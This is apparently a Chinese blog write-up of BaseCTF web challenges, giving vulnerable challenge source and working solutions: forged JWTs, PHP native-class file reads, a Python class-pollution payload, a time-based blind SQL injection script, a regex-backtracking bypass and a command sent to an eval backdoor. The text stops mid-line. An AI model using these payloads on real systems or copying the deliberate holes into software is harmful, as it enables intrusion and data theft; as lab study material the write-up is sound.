<h3 id="Week4-No-JWT"><a href="#Week4-No-JWT" class="headerlink" title="[Week4] No JWT"></a>[Week4] No JWT</h3><p>这里给出了源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment"># 随机生成 secret_key</span></span><br><span class="line">app.secret_key = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">16</span>))</span><br><span class="line"><span class="comment"># 登录接口</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    username = data.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = data.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 其他用户都给予 user 权限</span></span><br><span class="line">    token = jwt.encode(&#123;</span><br><span class="line">            <span class="string">&#x27;sub&#x27;</span>: username,</span><br><span class="line">            <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>,  <span class="comment"># 普通用户角色</span></span><br><span class="line">            <span class="string">&#x27;exp&#x27;</span>: datetime.datetime.utcnow() + datetime.timedelta(hours=<span class="number">1</span>)</span><br><span class="line">        &#125;, app.secret_key, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag 接口</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    token = request.headers.get(<span class="string">&#x27;Authorization&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> token:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            decoded = jwt.decode(token.split(<span class="string">&quot; &quot;</span>)[<span class="number">1</span>], options=&#123;<span class="string">&quot;verify_signature&quot;</span>: <span class="literal">False</span>, <span class="string">&quot;verify_exp&quot;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">            <span class="comment"># 检查用户角色是否为 admin</span></span><br><span class="line">            <span class="keyword">if</span> decoded.get(<span class="string">&#x27;role&#x27;</span>) == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    flag_content = f.read()</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;flag&#x27;</span>: flag_content&#125;), <span class="number">200</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Access denied: admin only&#x27;</span>&#125;), <span class="number">403</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Flag file not found&#x27;</span>&#125;), <span class="number">404</span></span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Token has expired&#x27;</span>&#125;), <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Invalid token&#x27;</span>&#125;), <span class="number">401</span></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Token is missing&#x27;</span>&#125;), <span class="number">401</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>很明显是一个jwt session伪造，这个就比较简单了</p>
<p>首先先拿到一个源session值，如果直接进行访问/login是没有的，它会提示你去提交一份json,这里就可以随便提交一个</p>
<p><img src="https://luokuang1.github.io/images/base10.png" width="95%" height="80%"></p>
<p>这里就可以去伪造session访问/flag了</p>
<p>直接将jwt部分放到<a href="https://jwt.io/里面进行伪造">https://jwt.io/里面进行伪造</a></p>
<p><img src="https://luokuang1.github.io/images/base11.png" width="95%" height="80%"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOm51bGwsInJvbGUiOiJhZG1pbiIsImV4cCI6MTcyNjMyMDY1N30.B02FczhiqpJleB5rmlcZ8fCVuFfSI4s3KuDCl2KUFpk</span><br></pre></td></tr></table></figure>
<p>最后将构造的payload伪造到请求头即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOm51bGwsInJvbGUiOiJhZG1pbiIsImV4cCI6MTcyNjMyMDY1N30.B02FczhiqpJleB5rmlcZ8fCVuFfSI4s3KuDCl2KUFpk</span><br></pre></td></tr></table></figure>
<h3 id="Week4-flag直接读取不就行了？"><a href="#Week4-flag直接读取不就行了？" class="headerlink" title="[Week4] flag直接读取不就行了？"></a>[Week4] flag直接读取不就行了？</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="comment"># 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$J1ng = $_POST[<span class="string">&#x27;J&#x27;</span>];</span><br><span class="line">$Hong = $_POST[<span class="string">&#x27;H&#x27;</span>];</span><br><span class="line">$Keng = $_GET[<span class="string">&#x27;K&#x27;</span>];</span><br><span class="line">$Wang = $_GET[<span class="string">&#x27;W&#x27;</span>];</span><br><span class="line">$<span class="built_in">dir</span> = new $Keng($Wang);</span><br><span class="line">foreach($<span class="built_in">dir</span> <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    echo($f . <span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">echo new $J1ng($Hong);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里就是两个类的初始化，但是又不是反序列的题，所以想要读取文件就需要通过php的原生类来读取</p>
<p>首先通过DirectoryIterator来进行目录遍历，配合glob伪协议即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?K=<span class="built_in">DirectoryIterator</span>&amp;W=glob:<span class="comment">///secret/*  //这里可以获取flag文件所在的位置</span></span><br></pre></td></tr></table></figure>
<p>读取文件就通过SplFileObject，再提交路径即可，最后flag在源码中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">J=<span class="built_in">SplFileObject</span>&amp;H=/secret/f11444g.php</span><br></pre></td></tr></table></figure>
<h3 id="Week4-圣钥之战1-0"><a href="#Week4-圣钥之战1-0" class="headerlink" title="[Week4] 圣钥之战1.0"></a>[Week4] 圣钥之战1.0</h3><p>这里提示去读read目录，给出源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask,request</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">merge</span>(src, dst):</span><br><span class="line">    <span class="keyword">for</span> k, v in src.<span class="title function_ invoke__">items</span>():</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.<span class="title function_ invoke__">get</span>(k) <span class="keyword">and</span> <span class="title function_ invoke__">type</span>(v) == dict:</span><br><span class="line">                <span class="title function_ invoke__">merge</span>(v, dst.<span class="title function_ invoke__">get</span>(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif <span class="title function_ invoke__">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="title function_ invoke__">type</span>(v) == dict:</span><br><span class="line">            <span class="title function_ invoke__">merge</span>(v, <span class="title function_ invoke__">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="title function_ invoke__">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">is_json</span>(data):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        json.<span class="title function_ invoke__">loads</span>(data)</span><br><span class="line">        <span class="keyword">return</span> True</span><br><span class="line">    except ValueError:</span><br><span class="line">        <span class="keyword">return</span> False</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cls</span>():</span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">__init__</span>(<span class="title">self</span>):</span></span><br><span class="line"><span class="class">        <span class="title">pass</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">instance</span> = <span class="title">cls</span>()</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">@<span class="title">app</span>.<span class="title">route</span>(&#x27;/&#x27;, <span class="title">methods</span>=[&#x27;<span class="title">GET</span>&#x27;, &#x27;<span class="title">POST</span>&#x27;])</span></span><br><span class="line"><span class="class"><span class="title">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line"><span class="class">    <span class="title">return</span> <span class="title">open</span>(&#x27;/<span class="title">static</span>/<span class="title">index</span>.<span class="title">html</span>&#x27;, <span class="title">encoding</span>=&quot;<span class="title">utf</span>-8&quot;).<span class="title">read</span>()</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">@<span class="title">app</span>.<span class="title">route</span>(&#x27;/<span class="title">read</span>&#x27;, <span class="title">methods</span>=[&#x27;<span class="title">GET</span>&#x27;, &#x27;<span class="title">POST</span>&#x27;])</span></span><br><span class="line"><span class="class"><span class="title">def</span> <span class="title">Read</span>():</span></span><br><span class="line"><span class="class">    <span class="title">file</span> = <span class="title">open</span>(<span class="title">__file__</span>, <span class="title">encoding</span>=&quot;<span class="title">utf</span>-8&quot;).<span class="title">read</span>()</span></span><br><span class="line"><span class="class">    <span class="title">return</span> <span class="title">f</span>&quot;<span class="title">J1ngHong</span>说：你想<span class="title">read</span> <span class="title">flag</span>吗？</span></span><br><span class="line"><span class="class">那么圣钥之光必将阻止你！</span></span><br><span class="line"><span class="class">但是小小的源码没事，因为你也读不到<span class="title">flag</span>(乐)</span></span><br><span class="line"><span class="class"></span>&#123;file&#125;</span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route(&#x27;/pollute&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="string">def Pollution():</span></span><br><span class="line"><span class="string">    if request.is_json:</span></span><br><span class="line"><span class="string">        merge(json.loads(request.data),instance)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        return &quot;</span>J1ngHong说：钥匙圣洁无暇，无人可以污染！<span class="string">&quot;</span></span><br><span class="line"><span class="string">    return &quot;</span>J1ngHong说：圣钥暗淡了一点，你居然污染成功了？<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &#x27;__main__&#x27;:</span></span><br><span class="line"><span class="string">    app.run(host=&#x27;0.0.0.0&#x27;,port=80)</span></span><br></pre></td></tr></table></figure>
<p>这里发现了python原型链污染的函数,还真是一点都不变，这里/static/index.html发现可能存在一个静态的代码文件夹，所以就可以去尝试污染一下静态代码文件夹的位置</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">def <span class="title function_ invoke__">merge</span>(src, dst):</span><br><span class="line">    <span class="keyword">for</span> k, v in src.<span class="title function_ invoke__">items</span>():</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.<span class="title function_ invoke__">get</span>(k) <span class="keyword">and</span> <span class="title function_ invoke__">type</span>(v) == dict:</span><br><span class="line">                <span class="title function_ invoke__">merge</span>(v, dst.<span class="title function_ invoke__">get</span>(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif <span class="title function_ invoke__">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="title function_ invoke__">type</span>(v) == dict:</span><br><span class="line">            <span class="title function_ invoke__">merge</span>(v, <span class="title function_ invoke__">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="title function_ invoke__">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure>
<p>最后的payload就可以得，简单说明一下，通过调用一个类的<strong>init</strong>魔术方法再调用<strong>globals</strong>获取全局属性，再修改app下的静态目录地址为当前的目录即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;_static_folder&quot;</span>:<span class="string">&quot;./&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后就可以直接访问/static/flag获取flag</p>
<h3 id="Week4-only-one-sql"><a href="#Week4-only-one-sql" class="headerlink" title="[Week4] only one sql"></a>[Week4] only one sql</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sql&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/select|;|@|\n/i&#x27;</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你知道的，不可能有sql注入&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&quot;|\$|`|\\\\/i&#x27;</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你知道的，不可能有RCE&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag in ctf.flag</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;没有select，让你执行一句又如何&#x27;;&quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$query</span>);</span><br></pre></td></tr></table></figure>
<p>这里刚开始以为可以rce，但是分析发现，输入的语句还在数据库语句中，所以应该只可以进行sql注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">show tables <span class="comment">//Tables_in_ctf flag</span></span><br><span class="line">show columns <span class="keyword">from</span> flag <span class="comment">//Field        Type        Null        Key        Default        Extra id        varchar(300)        YES                NULL         data        varchar(300)        YES                NULL         </span></span><br></pre></td></tr></table></figure>
<p>这里可以先通过show命令来获取基本的信息</p>
<p>这里禁用了select，不能直接获取，就可以尝试通过盲注的方法来进行读取,题解中给出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">delete <span class="keyword">from</span> flag where data like <span class="string">&#x27;B%&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">sleep</span>(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
<p>%表示匹配任意数量的字符，这样就代表了B开头的字符串</p>
<p>这样就可以通过盲注来进行爆破</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import <span class="keyword">string</span></span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">sqlstr = <span class="string">&quot;qwertyiuopasdfghjklzxcvbnm-&#123;&#125;1023456789&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://challenge.basectf.fun:40165/&quot;</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c in sqlstr:</span><br><span class="line">        <span class="comment"># print(c)</span></span><br><span class="line">        payload = <span class="string">&quot;update flag set id = &#x27;wi&#x27; where data regexp &#x27;^Base&#x27; and if(data REGEXP &#x27;^&#123;&#125;&#x27;,sleep(1.5), 1)&quot;</span>.<span class="title function_ invoke__">format</span>((flag + c))</span><br><span class="line">        params = &#123;</span><br><span class="line">                        <span class="string">&#x27;sql&#x27;</span>: payload</span><br><span class="line">                    &#125;</span><br><span class="line">        start_time = time.<span class="title function_ invoke__">time</span>()</span><br><span class="line">        r = requests.<span class="title function_ invoke__">get</span>(url=url, params=params)</span><br><span class="line">        <span class="keyword">print</span>(r.text)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.<span class="title function_ invoke__">get</span>(url=url,params=params)</span><br><span class="line">            <span class="keyword">print</span>(r.text)</span><br><span class="line">            end_time = time.<span class="title function_ invoke__">time</span>()</span><br><span class="line">            response_time = end_time - start_time</span><br><span class="line">            <span class="keyword">if</span> response_time&gt;<span class="number">1</span>:</span><br><span class="line">                <span class="keyword">print</span>(flag + c)</span><br><span class="line">                flag += c</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        except:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;Request failed&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<h3 id="Fin-1z-php"><a href="#Fin-1z-php" class="headerlink" title="[Fin] 1z_php"></a>[Fin] 1z_php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="comment"># 我记得她...好像叫flag.php吧？</span></span><br><span class="line"><span class="variable">$emp</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;e_m.p&#x27;</span>];</span><br><span class="line"><span class="variable">$try</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;try&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$emp</span>!=<span class="string">&quot;114514&quot;</span>&amp;&amp;<span class="title function_ invoke__">intval</span>(<span class="variable">$emp</span>,<span class="number">0</span>)===<span class="number">114514</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$emp</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$emp</span>[<span class="variable">$i</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;你不是hacker？那请去外场等候！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;只有真正的hacker才能拿到flag！&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?HACKER/is&#x27;</span>,<span class="variable">$try</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;你是hacker还敢自报家门呢？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">stripos</span>(<span class="variable">$try</span>,<span class="string">&#x27;HACKER&#x27;</span>) === <span class="literal">TRUE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;你连自己是hacker都不承认，还想要flag呢？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$b</span>,<span class="string">&#x27;php&#x27;</span>)!==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;收手吧hacker，你得不到flag的！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$b</span>))-&gt;<span class="variable">$c</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;114514到底是啥意思嘞？。？&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 觉得困难的话就直接把shell拿去用吧，不用谢~</span></span><br><span class="line"><span class="variable">$shell</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$shell</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里直接提交shell没用，但是最后出的时候调用又可以</p>
<p>首先注意参数的合法，需要将第一个<em>改为[才可以不让后面的.解析为</em></p>
<p>这里第一个if有两个绕过方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?e[m.p=<span class="number">0337522</span> <span class="comment">//这个通过八进制绕过 或者 </span></span><br><span class="line">?e[m.p=<span class="number">114514.2</span> <span class="comment">//通过小数绕过</span></span><br></pre></td></tr></table></figure>
<p>后面这两个if有些矛盾，如果想直接绕过很困难，先分析一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?HACKER/is&#x27;</span>,<span class="variable">$try</span>)<span class="comment">//这里通过匹配多个字符在HACKER前面，忽略大小写和通过多行匹配，这里如果HACKER前面没用字符就不会匹配成功</span></span><br><span class="line">!<span class="title function_ invoke__">stripos</span>(<span class="variable">$try</span>,<span class="string">&#x27;HACKER&#x27;</span>) === <span class="literal">TRUE</span> <span class="comment">//这里就是如果HACKER在最开始的位置出现就为true</span></span><br></pre></td></tr></table></figure>
<p>后面的stripos没有办法绕过，但是前面的正则可以通过正则回溯来进行绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = <span class="string">&#x27;http://challenge.basectf.fun:49472/?e[m.p=0337522&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;try&#x27;</span>: <span class="string">&#x27;aaaa&#x27;</span> * <span class="number">250001</span> + <span class="string">&#x27;HACKER&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.<span class="title function_ invoke__">post</span>(url=url, data=data).text</span><br><span class="line"><span class="keyword">print</span>(r)</span><br></pre></td></tr></table></figure>
<p>最后面就是一个原生类调用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$b</span>,<span class="string">&#x27;php&#x27;</span>)!==<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;收手吧hacker，你得不到flag的！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$b</span>))-&gt;<span class="variable">$c</span>();</span><br></pre></td></tr></table></figure>
<p>这里需要调用类的一个方法，可以想到通过fgets来读取文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&amp;a=<span class="built_in">SplFileObject</span>&amp;b=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php&amp;c=fgets</span></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://challenge.basectf.fun:49472/?e[m.p=0337522&amp;a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php&amp;c=fgets&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;try&#x27;</span>: <span class="string">&#x27;aaaa&#x27;</span> * <span class="number">250001</span> + <span class="string">&#x27;HACKER&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.<span class="title function_ invoke__">post</span>(url=url, data=data).text</span><br><span class="line"><span class="keyword">print</span>(r)</span><br></pre></td></tr></table></figure>
<p>解码即可</p>
<p>这里也可以再提交shell来rce,但是还得构造好payload之后，真的不知道原来干嘛的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://challenge.basectf.fun:49472/?e[m.p=0337522&amp;a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php&amp;c=fgets&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;try&#x27;</span>: <span class="string">&#x27;aaaa&#x27;</span> * <span class="number">250001</span> + <span class="string">&#x27;HACKER&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;shell&#x27;</span>:<span class="string">&quot;system(&#x27;cat f*&#x27;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.<span class="title function_ invoke__">post</span>(url=url, data=data).text</span><br><span class="line"><span class="keyword">print</span>(r)</span><br></pre></td></tr></table></figure>
<h3 id="Fin-Jinja-Mark"><a href="#Fin-Jinja-Mark" class="headerlink" title="[Fin] Jinja Mark"></a>[Fin] Jinja Mark</h3><p><img src="https://luokuang1.github.io/images/base12.png" width="95%" height="80%"></p>
<p>在/index下有一个输入框，当尝试去进行ssti时就出现提示</p>
<p><img src="https://luokuang1.github.io/images/base13.png" width="95%" height="80%"></p>
<p>但是当打开/magic时就需要通过post提交什么东西</p>
<p>先去/flag中看看</p>
<p><img src="https://luokuang1.github.io/images/base14.png" width="95%" height="80%"></p>
<p>这里就可能需要我们去进行爆破的lucky_number，直接通过bp来进行爆破就可以的lucky_number</p>
<p><img src="https://luokuang1.github.io/images/base15.png" width="95%" height="80%"></p>
<p>这里就是5346，提交之后就得源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">BLACKLIST_IN_index = [<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line">def <span class="title function_ invoke__">merge</span>(src, dst):</span><br><span class="line">    <span class="keyword">for</span> k, v in src.<span class="title function_ invoke__">items</span>():</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.<span class="title function_ invoke__">get</span>(k) <span class="keyword">and</span> <span class="title function_ invoke__">type</span>(v) == dict:</span><br><span class="line">                <span class="title function_ invoke__">merge</span>(v, dst.<span class="title function_ invoke__">get</span>(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif <span class="title function_ invoke__">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="title function_ invoke__">type</span>(v) == dict:</span><br><span class="line">            <span class="title function_ invoke__">merge</span>(v, <span class="title function_ invoke__">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="title function_ invoke__">setattr</span>(dst, k, v)</span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/magic&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>])</span><br><span class="line">def <span class="title function_ 